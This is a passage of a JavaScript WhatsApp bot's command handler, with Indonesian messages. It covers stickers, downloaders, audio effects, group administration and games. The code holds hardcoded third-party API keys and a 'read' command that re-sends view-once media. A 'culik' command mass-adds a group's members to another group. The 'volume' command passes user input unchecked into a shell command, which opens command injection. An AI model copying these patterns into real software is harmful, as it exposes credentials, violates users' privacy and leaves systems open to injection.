if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
  if ((isMedia || isQuotedImage || isQuotedSticker)) {
    try{
    const media = await conn.downloadAndSaveMediaMessage(quoted)
    let ranw = getRandom('.webp')
    let ranp = getRandom('.png')
    var api = [ 'tCWQbncx6tcVXTZUXyrHbW2e', 'p6ZKgU1wthihGqymYncxuBNu', 'kFz7BEPgVY8VyxW5CxVM7P9J', '2AjasifpR9DNpqpRQKTKWQsZ', 'TmyvKbt8DE1tjTMsQCA34dRt', 'smKvqY2ia86MptoZGUWFRc8G']
    var key = api[Math.floor(Math.random() * api.length)]
    let keyrmbg = `${key}`

    await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
        fs.unlinkSync(media)
        let bufferir9vn5 = Buffer.from(res.base64img, 'base64')
        fs.writeFileSync(ranp, bufferir9vn5, (err) => {
  if (err) return reply ('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
        })
  makeSticker(fs.readFileSync(ranp),Sticker, StickerTypes)
      fs.unlinkSync(ranp)
        }) 
        
  } catch (err){
console.log (`${err}`)
}   
  }
}
db.data.users[sender].limit -= 1 // -1 limit
break


    
      
case 'apatuh': case 'read': {
	let { downloadContentFromMessage } = require('@adiwajshing/baileys')
	if (!m.quoted) return setReply(`Balas pesan viewOnce nya!`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return setReply( 'Yang kamu balas bukan pesan viewOnce')
  let pel = `*User* : @${m.quoted.sender.split("@")[0]} mengirim pesan viewOnce `
			conn.sendMessage(from, { text: pel, mentions: [m.quoted.sender] }, {quoted: m })
	let type = Object.keys(m.quoted.message)[0]
	let qu = m.quoted.message[type]
	let media = await downloadContentFromMessage(qu, type == 'imageMessage' ? 'image' : 'video')
	let buffer = Buffer.from([])
  let txt = (m.quoted.message[type].caption) || ''
	for await (const chunk of media) {
	buffer = Buffer.concat([buffer, chunk])
	}
	if (/video/.test(type)) {
	return conn.sendFile(m.chat, buffer, 'media.mp4', txt, m)
	} else if (/image/.test(type)) {
	return conn.sendFile(m.chat, buffer, 'media.jpg', txt, m)
	}
	}
	break
	


case 'tagmark': case 'tagwa':{
 conn.sendMessage(from, { text: `@0`,  mentions: [`0@s.whatsapp.net`] })
}
break
    
case 'tagme':  {  
       conn.sendMessage(from, { text: `@${sender.split("@")[0]}`, mentions: [sender] })
  }
    break


case "gempa":
try {
const {data} = await axios.get("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json")
let asbnfvashfgyjas = `┌──「 *G E M P A* 」
│
├ *TimeStamp:* ${data.Infogempa.gempa.Tanggal}
├ *Time:* ${data.Infogempa.gempa.Jam}
├ *Coordinates:* ${data.Infogempa.gempa.Coordinates}
├ *Magnitude:* ${data.Infogempa.gempa.Magnitude}
├ *Depth:* ${data.Infogempa.gempa.Kedalaman}
├ *Region:* ${data.Infogempa.gempa.Wilayah}
├ *Potention:* ${data.Infogempa.gempa.Potensi}
├ *Effect:* ${data.Infogempa.gempa.Dirasakan}
│
└──「 *I C Z A* 」 `
sendFileFromUrl(from, "https://data.bmkg.go.id/DataMKG/TEWS/" + data.Infogempa.gempa.Shakemap, asbnfvashfgyjas)
} catch (err) {
setReply(util.format(err))
}
break


case 'truth':
		const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
		const ttrth = trut[Math.floor(Math.random() * trut.length)]
		setReply (`${ttrth}`) 
		break
			

case 'dare':
		const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
		const der = dare[Math.floor(Math.random() * dare.length)]
		setReply (`${der}`) 
		break

    
    

case 'cry':
case 'kill':
case 'hug':case 'pat':case 'lick':case 'kiss':case 'bite':case 'yeet':case 'neko':case 'bully':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'awoo':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'cuddle':case 'highfive':case 'shinobu':case 'megumin':case 'handhold':
setReply(mess.wait)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
	conn.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
break

		
		

					
    
	case 'getname':
	case 'getnama':
	if(isGroup) {
	console.log(users)
	const sname = await conn.getName(users)
	setReply(`${sname}`)
	} else if(!isGroup) {
	const yahu = await conn.getName(users)
	setReply(`${yahu}`)
	} else{
	setReply("Reply targetnya")
	}
	break
	  
	
	 
	case 'del':
	if(!mentionByReply) return setReply("Reply pesan")
	if (mentionByReply == botNumber) {
	conn.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: dev.quoted.id, participant: mentionByReply } })
	} else if(mentionByReply !== botNumber && isBotGroupAdmins){
	conn.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: dev.quoted.id, participant: mentionByReply } })
	} 
	break
	
	
	
	
	case  's':
	case  'sticker':
	try{
	if (isImage || isQuotedImage || isVideo || isQuotedVideo) {
	 if (quoted.seconds > 10) return setReply ('Maksimal 10 detik!')
	let kualitas = isImage? 70 : 2
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let jancok = new Sticker(media, {
		pack: packName, // The pack name
		author: authorName, // The author name
		type: StickerTypes.FULL, // The sticker type
		categories: ['🤩', '🎉'], // The sticker category
		id: '12345', // The sticker id
		quality: kualitas, // The quality of the output file
		background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await conn.sendMessage(from,{sticker: nah},{quoted: dev})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
	} else {
	setReply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`)
	}
	} catch (e) {
		reply('Sistem Erorr, Maksimal Durasi video 10 detik')
		}
	break
	
	

	case 'toimg': {
	if (!isQuotedSticker) return setReply('Reply stickernya')
	setReply(mess.wait)
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.png')
	exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
	fs.unlinkSync(media)
	if (err) return setReply(err)
	let buffer = fs.readFileSync(ran)
	await conn.sendMessage(from, {caption: "Nih", image: buffer})
	fs.unlinkSync(ran)
	})
	}
	break
	
	
	
	       
		   
	case 'runtime':{
    let data = global.db.data.others['runtime']
let time = (new Date - data.runtime) || 'lamanya'
    setReply (`⏰ Bot aktif selama ${clockString(time)}`)
	//setReply(`⏰ Bot aktif selama ${runtime(process.uptime())}`)
  }
	break
	
	case 'out':
	if (!isGroup) return 
	if (!isOwner) return onlyOwner()
	await conn.groupLeave(from)
	break
	
	case 'ss':
if(!q) return setReply("Masukan Link")
if(!isUrl(args[0]) && !args[0].includes('www.')) return reply("Link error");
let Url = `https://api.apiflash.com/v1/urltoimage?access_key=185eff3aa9fe4e3c8e30bda63b1fb9cf&wait_until=page_loaded&url=${q}`
conn.sendMessage(from,{image:{url: Url},caption:"Nih"},{quoted:m})
break  

	case 'ss':{
	if(!q) return setReply("Masukan Link")
	if(!isUrl(args[0]) && !args[0].includes('www.')) return reply("Link error");
	if (args.length < 1) return setReply('Urlnya mana om')
	let teks = q
	let ana = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
	let buff = await getBuffer(ana.screenshot)
	await conn.sendMessage(from, {caption : `Link: ${teks}`, image: buff}, {quoted: dev})
	}
	break

  
    
	
	case 'culik':{
	if (!isOwner && !itsMe) return setReply(mess.only.ownerB)
	if (args.length < 1) return reply('_*Masukin id grupnya*_')
	let mem = [];
	await groupMembers.map( i => mem.push(i.id) )
	await conn.groupParticipantsUpdate(q, mem, 'add')
	setReply("Sukses")
	}
	break
		
	case 'kick': {
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isGroup) return setReply(mess.only.group)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	if(!Input) return setReply("Tag/Mention/Masukan nomer target")
	if (Input.startsWith('08')) return setReply('Awali nomor dengan 62')
	await conn.groupParticipantsUpdate(from, [Input], 'remove').then((res) => setReply(`Berhasil mengeluarkan  ${Input.split("@")[0]} ke dalam group ${groupName}`)).catch((err) => setReply(jsonformat(err))) 
	}
	break
		
	
	case 'add': {
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isGroup) return setReply(mess.only.group)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	if(!Input) return setReply("Tag/Mention/Masukan nomer target")
	if (Input.startsWith('08')) return setReply('Awali nomor dengan 62')
	await conn.groupParticipantsUpdate(from, [Input], 'add').then((res) =>{
	if(res[0].status == 200) setReply(`Berhasil menambahkan ${Input.split("@")[0]} ke dalam group ${groupName}`)
	if(res[0].status == 403) setReply(`Gagal menambahkan ${Input.split("@")[0]} ke dalam group ${groupName}`)
	}).catch((err) => setReply(jsonformat(err))) 
	}
	break
		
	case 'demote': {
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isGroup) return setReply(mess.only.group)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	await conn.groupParticipantsUpdate(from, [users], 'demote').then((res) => setReply(`Sukses Demote ${users}`)).catch((err) => setReply(jsonformat(err)))
	}
	break
	
	
	
	
	case 'admin': case 'promote': {
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isGroup) return setReply(mess.only.group)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	await conn.groupParticipantsUpdate(from, [users], 'promote').then((res) => setReply(`Sukses Promote ${users}`)).catch((err) => setReply(jsonformat(err)))
	}
	break
				
				
	case 'pinterest':{
	if (args.length < 1) return setReply (`Kirim perintah ${command} query atau ${command} query --jumlah\nContoh :\n${command} cecan atau ${command} cecan --10`)
	setReply (mess.wait)
	var jumlah;
	if (q.includes('--')) jumlah = q.split('--')[1]
	pinterest(q.replace('--'+jumlah, '')).then(async(data) => {
	if (q.includes('--')) {
	if (data.length < jumlah) {
	jumlah = data.length
	setReply(`Hanya ditemukan ${data.length}, foto segera dikirim`)
	}
	for (let i = 0; i < jumlah; i++) {
	conn.sendMedia(from, data[i])
	}
	} else {
	conn.sendMessage(from, { caption: `Hasil pencarian dari ${q}`, image: { url: pickRandom(data)}}, {quoted: dev})
    }
	})
	}
	break
				

	
	
	
	case 'join':{
	if(!isOwner) return setReply(mess.only.owner)
	let link = q.startsWith("http")
	if(!link) return setReply(`Kirim perintah ${command} _linkgrup_`)
	var url = args[1]
	let ano = q.split('https://chat.whatsapp.com/')[1]
	await conn.groupAcceptInvite(ano)
	setReply("Sukses join group")
	}
	break
	
	
	case 'hidetag':
	if (!isGroup) return setReply(mess.only.group)
	if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
	let mem = [];
	groupMembers.map( i => mem.push(i.id) )
	conn.sendMessage(from, { text: q ? q : '', mentions: mem })
	break
	
	
	case 'lirik':{
    setReply (mess.wait)
	 lyrics (q).then(res => {
     conn.sendMessage(from, {caption: res.lyrics, image: {url: 'https://telegra.ph/file/64b515413ede2f91c16cf.jpg'}}, {quoted: dev})
     }).catch(() => reply(`Judul lagu tidak ditemukan`))
	}
	break
	
	case 'public':
	if (!isOwner) return onlyOwner()
	if (publik) return setReply('Udah di mode publick kak')
	publik = true
	let bab =`Mode public aktif kak`
	setReply(bab)
	break
			   
	case 'self':
	if (!isOwner) return onlyOwner()
	if (publik == false) return setReply('Udah di mode self kak')
	publik = false
	let breh =`Mode self aktif kak`
	setReply(breh)
	break
	
	

	
	
	case 'kalkulator':
	const matematik = require('mathjs')
	try{
	let nana = q.replace("x","*")
	let nunu = matematik.evaluate(nana)
	let teks = `${q} = ${nunu}`
	setReply(teks)
	} catch (err){
	setReply( 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
	}
	break
	
	
	case 'toptt':
	if (isQuotedAudio){
	setReply(mess.wait)
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
	fs.unlinkSync(media)
	if (err) return setReply('Gagal mengkonversi audio ke ptt')
	let topt = fs.readFileSync(ran)
	await conn.sendMessage(from,{audio: topt, mimetype: 'audio/mp4', ptt:true}, {quoted: dev})
	fs.unlinkSync(ran)
	})
	} else {
	setReply("Reply audio")
	}
	break
	
	
	case 'togif':
	if ( isQuotedSticker) {
	setReply(mess.wait)
	let file = await  conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let outGif = `./temp/${getRandom('.gif')}`
	let outMp4 = `./temp/${getRandom('.mp4')}`
	
	//convert webp ke gif pakai imagemagick
	exec(`convert ${file} ${outGif}`, (err) => {
	if (err) {
	console.log(err)
	return setReply(`${err}`)
	}
	
	//lalu convert gif ke mp4 pakai ffmpeg
	exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
	if (err) {
	console.log(err)
	return setReply(`${err}`)
	 }      
	await sendGif(fs.readFileSync(outMp4))
	 fs.unlinkSync(outGif)
	 fs.unlinkSync(outMp4)
	 fs.unlinkSync(file)
		})
	}) 
	
	} else if(isQuotedVideo){
	setReply(mess.wait)
	let outMp4 = getRandom('.mp4')
	let file = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let nana = await fs.readFileSync(file)
	await sendGif(nana)
	await fs.unlinkSync(file)
	}
	break
	
	
	
	
	case 'tomp3':
	if (isQuotedVideo) {
	setReply(mess.wait)
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} -vn ${ran}`, async (err) => {
	fs.unlinkSync(media)
	if (err) return setReply(`Err: ${err}`)
	let buffer453 = fs.readFileSync(ran)
	await conn.sendMessage(from, {mimetype: 'audio/mp4', audio: buffer453}, { quoted: dev })
	fs.unlinkSync(ran)
	})
	} else {
	setReply("Reply videonya")
	}
	break
				
				
	
				
	case 'hode':
	 if(isQuotedAudio) { 
	setReply(mess.wait)
	let medok = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${medok} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, async (err, stderr, stdout) => {
	fs.unlinkSync(medok)
	if (err) return setReply('Error!')
	let buffer453 = fs.readFileSync(ran)
	await conn.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: dev })
	fs.unlinkSync(ran)
	})
	} else {
	setReply('Reply audionya')
	}
	break
	
	case 'volume':
	if (Number(args[0]) >= 11) return setReply("Maksimal volume adalah 10")
	if (isQuotedAudio){ 
	setReply(mess.wait)
	let media3 = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let rname = getRandom('.mp3')
	exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, async (err, stderr, stdout) => {
	if (err) return setReply('Error!')
	let jadie = fs.readFileSync(rname)
	await conn.sendMessage(from, {audio: jadie, mimetype: 'audio/mp4', ptt: true }, {quoted: dev})
	fs.unlinkSync(rname)
	fs.unlinkSync(media3)
	}
	)
	} else {
	setReply('Reply audio!')
	}
	break
			   
				
	case 'ghost':
	if(isQuotedAudio) { 
	setReply(mess.wait)
	let mele = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${mele} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, async (err, stderr, stdout) => {
	fs.unlinkSync(mele)
	if (err) return setReply('Error!')
	let buffer453 = fs.readFileSync(ran)
	await conn.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: dev })
	fs.unlinkSync(ran)
	}) 
	} else {
	setReply('Reply audionya')
	}
	break
	
	
	
	case 'nightcore':
	if(isQuotedAudio) { 
	setReply(mess.wait)
	let mela = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${mela} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, async (err, stderr, stdout) => {
	fs.unlinkSync(mela)
	if (err) return setReply('Error!')
	let buffer453 = fs.readFileSync(ran)
	await conn.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: dev })
	fs.unlinkSync(ran)
	})
	} else {
	setReply('Reply audionya')
	}
	break
	
	
	
	case 'tupai':
	if(isQuotedAudio) { 
	setReply(mess.wait)
	let medoi = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${medoi} -filter:a "atempo=0.8,asetrate=65100" ${ran}`, async (err, stderr, stdout) => {
	fs.unlinkSync(medoi)
	if (err) return setReply('Error!')
	let buffer453 = fs.readFileSync(ran)
	await conn.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: dev })
	fs.unlinkSync(ran)
	})
	} else {
	setReply('Reply audionya')
	}
	break
	
	
	case 'ping': {
	
	const used = process.memoryUsage()
	let timestamp = speed()
	let latensi = speed() - timestamp
	let neww = performance.now()
	let oldd = performance.now()
	let respon = `
	Kecepatan Respon ${latensi.toFixed(4)} _Second_ 
	Info Server
	RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
	
	_NodeJS Memory Usaage_
	${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
	
	`.trim()
	setReply(respon)
				}
				break
	
	
	case 'imut':
	if(isQuotedAudio) { 
	setReply(mess.wait) 
	let masa = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${masa} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, async (err, stderr, stdout) => {
	fs.unlinkSync(masa)
	if (err) return setReply('Error!')
	let buffer453 = fs.readFileSync(ran)
	await conn.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: dev })
	fs.unlinkSync(ran)
	})
	} else {
	setReply('Reply audionya')
	}
	break
	
	
	
	
	
	case 'tomp4':
	if (isQuotedSticker) {
	setReply(mess.wait)
	let file = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let outGif = `${getRandom('.gif')}`
	let outMp4 = `${getRandom('.mp4')}`
	//convert webp ke gif pakai imagemagick
	exec(`convert ${file} ${outGif}`, (err) => {
	if (err) {
	console.log(err)
	return setReply(`${err}`)
	}
	
	//lalu convert gif ke mp4 pakai ffmpeg
	exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
	if (err) {
	console.log(err)
	return setReply(`${err}`)
	 }      
	await conn.sendMessage(from,{video: fs.readFileSync(outMp4), caption: "Nih"},{quoted: dev})
	 fs.unlinkSync(outGif)
	 fs.unlinkSync(outMp4)
	 fs.unlinkSync(file)
	})
	}) 
	
	}
	break
	
	
	case 'attp':
	 try {
	if (args.length == 0) return setReply(`Example: ${prefix + command} YUcnn`)
	let yog = `https://oni-chan.my.id/api/canvas/attp?text=${q}&apikey=istighfar`
     makeSticker(yog,Sticker, StickerTypes)
	} catch (e) {
	 setReply(`Maap sedang error coba lagi besok`)            
	}
	break
				  
	
		
case 'twiter': case 'twitter': case 'twitterdl': {
	try{
if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
if (!q) return setReply (`Linknya?\nContoh: ${prefix + command} https://twitter.com/Ceice/status/1568760979332239363?t=Fu5RjUmQB1KELXt0Toj8FA&s=19`)
setReply (mess.wait)
 let res = await savefrom (q)
for(const {url} of res.url) conn.sendFile(from, url, 'tw.mp4', `*TWITTER DOWNLOADER*\n\n${res.meta.title}`, dev)
} catch (e) {
	reply('Sedang Eror coba lagi nanti')
	}
}
db.data.users[sender].limit -= 1 // -1 limit
break



case 'facebook': case 'fbdl': case 'fb': {
try{
if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
if (!q) return setReply ('Linknya?')
reply(mess.wait)
let res = await savefrom(args[0])
conn.sendMessage(from, {caption: "*FACEBOOK DOWNLOAD*", video: {url: res.url[1].url}}, {quoted: m})
} catch (err){
return setReply ("sedang erorr coba lagi nanti")
}
}
db.data.users[sender].limit -= 1 // -1 limit
break

		
	case 'kodepos':
	try{
	let nana = await kodepos(q)
	console.log(nana)
	let teks =`Berikut Daftar kode pos\nYang telah di temukan\n\n`
	for (let i of nana){
	 teks +=`Provinsi: ${i.province}\nKota: ${i.city}\nKecamatan: ${i.subdistrict}\nKabupanten: ${i.urban}\nKode Pos: ${i.postalcode}\n\n═════════════════\n\n`
	}
	setReply(teks)
	} catch (err){
	setReply("Kodepos tidak di temukan")
	console.log(err)
	}
	break  
	  
	  
	case 'ghstalk':{
	let nana = await ghstalk(q)
	console.log(nana)
	let foto = nana.avatar_url
	let gambar = await getBuffer(foto)
	console.log(foto)
	let toks =`
	Nama: ${nana.name}
	Bio: ${nana.bio}
	Followers: ${nana.followers}
	Following: ${nana.following}
	Repository: ${nana.public_repos}
	Created at: ${nana.created_at}
	Update at: ${nana.updated_at}
	Twitter: ${nana.twitter_username}
	Email: ${nana.email}
	Lokasi: ${nana.location}
	Website: ${nana.blog}
	Github url: ${nana.url}
	`
	console.log(toks)
	await conn.sendMessage(from, {image:gambar, caption: toks},{quoted: dev})
	//await conn.sendMedia (from, foto, dev, {caption: toks})
	}
	break
				
	case 'gimage':{
	if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
	if (args.length < 1) return setReply('Apa Yang Mau Dicari?')
	try{
	const {googleImage} = require('@bochilteam/scraper')
	googleImage(q).then(async (data) => {
	//console.log(data)
	let foto = data[Math.floor(Math.random() * data.length)]
	if(data.length == "0") return setReply("Image tidak di temukan")
	setReply(mess.wait)
	conn.sendMedia (from, foto, dev, {caption: "Nih"})
	})
	} catch(err){
	let teks = args.join(' ')
	let res = await gis(teks, google)
	function google(error, result){
	if (error){ return setReply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
	else {
	var gugIm = result
	var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
	conn.sendMedia (from, random, dev, {caption:  `*Hasil Pencarian Dari :* ${teks}`})
	}
	}
	}
	}
	db.data.users[sender].limit -= 1 // -1 limit
	break
				
			

			
	case '3000years':
	case 'approved':
	case 'wanted':
	case 'utatoo':
	case 'unsharpen':
	case 'thanos':
	case 'sniper':
	case 'sharpen':
	case 'sepia':
	case 'scary':
	case 'rip':
	case 'redple':
	case 'rejected':
	case 'posterize':
	case 'ps4':
	case 'pixelize':
	case 'missionpassed':
	case 'moustache':
	case 'lookwhatkarenhave':
	case 'jail':
	case 'invert':
	case 'greyscale':
	case 'glitch':
	case 'gay':
	case 'frame':
	case 'fire':
	case 'distort':
	case 'dictator':
	case 'deepfry':
	case 'ddungeon':
	case 'circle':
	case 'challenger':
	case 'burn':
	case 'brazzers':
	case 'beautiful': {
	const ameClient = require("amethyste-api")
	const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
	if(isImage || isQuotedImage || isQuotedSticker){  
	try{
	setReply(mess.wait)
	let ahah = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let owgi = await uploadFile (ahah)
	let ini_gen = `${command}`
	ameApi.generate(ini_gen, { url : owgi}).then(gambar => {
	conn.sendMessage(from, {image: gambar, caption: "Nih"  }, {quoted: dev})
	fs.unlinkSync(ahah) 
	})
	}catch(err){
	console.log(err)
	}
	} else if (isQuotedTag || isQuotedReply) {
	setReply(mess.wait)
	let ghost = users 
	let oppp = await conn.profilePictureUrl(ghost, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
	let ini_gen = `${command}`
	ameApi.generate(ini_gen, {
	url : oppp
	}).then(gambar => {
	conn.sendMessage(from, {image: gambar, caption: "Nih" }, {quoted: dev})
	}).catch(err => {
	setReply(`${err}`)
	});    
	} else {
	setReply("Tag atau Reply targetnya")
	}
	}
	break
	
	
case 'mediafire': case 'mfdl':
if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
  if (args.length < 1) return reply(`Kirim perintah ${command} link`)        
 setReply (mess.wait)                   
  mediafiredll(q).then(async(data) => {
  let tuks =`*---------[ Data Berhasil Diperoleh ]---------*

File Name : ${data.name}
File Size : ${data.size}
Mime : ${data.mime}
Upload : ${data.date}
Link : ${data.link}
`
 reply (tuks)
console.log(data)
 var media = await getBuffer(data.link)
 await conn.sendMedia (from, media, dev, {fileName: data.name})                    
}).catch(() => setReply ('Sedang erorr coba lgi nanti'))
db.data.users[sender].limit -= 1 // -1 limit
break
    
	
	
	
	case 'tinyurl':{
	if (args.length < 1) return setReply(`Masukkan link`)
	if (!isUrl) return setReply(`Masukkan link`)
	const fetchText = (url, optiono) => {
	return new Promise((resolve, reject) => {
	return fetch(url, optiono)
	.then(response => response.text())
	.then(text => resolve(text))
	.catch(err => {
	console.log(color(err,'red'))
	reject(err)
	})
	})
	}
	let okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
	let shorti = `*Result : ${okok}*`
	setReply(shorti)
	}
	break  
	
	
	case 'bitly':{
	const { BitlyClient } = require('bitly');
	const bitly = new BitlyClient('7d737131e678fc366699edead8bca146e69f6c78', {});
	if(!q) return setReply("Masukan link")
	if(!isUrl) return setReply("Masukan link dengan benar")
	try {
	let result = await bitly.shorten(q);
	setReply(`Link: ${result.link}\nCreated at: ${result.created_at}`)
	} catch(e) {
	setReply(`Url invalid`)
	}
	}
	break;
	
	
	
	case 'githubdl':{
	if(!q.includes("|")) return setReply(`Contoh ${prefix}${command}githubdl username|repository`)
	let url = `https://github.com/${q.split("|")[0]}/${q.split("|")[1]}/archive/refs/heads/master.zip`
	console.log("Done")
	setReply(`Waiting for compress to zip`)
	await conn.sendMedia (from, url, dev, {fileName: q.split("|")[1]})
	}
	break 
	  
	  
	  
	case 'gitclone':
	try{
	let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
	if (!q) return setReply( 'link githubnya mana? contoh: https://github.com/saipulanuar/v18 ')
	if (!regex.test(q)) return setReply('link salah!')
	let [, user, repos] = q.match(regex) || []
	let repo = repos.replace(/.git$/, '')
	let url = `https://api.github.com/repos/${user}/${repos}/zipball`
	let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
	// 'attachment; filename=ilmanhdyt/ShiraoriBOT-Mdv2.5.1-251-g836cccd.zip'
	setReply(`*Mohon tunggu, sedang mengirim repository..*`)
	await conn.sendMedia (from, url, dev, {fileName: filename})
	} catch (err){
	setReply(mess.error.link)
	}
	break  
	
	

	
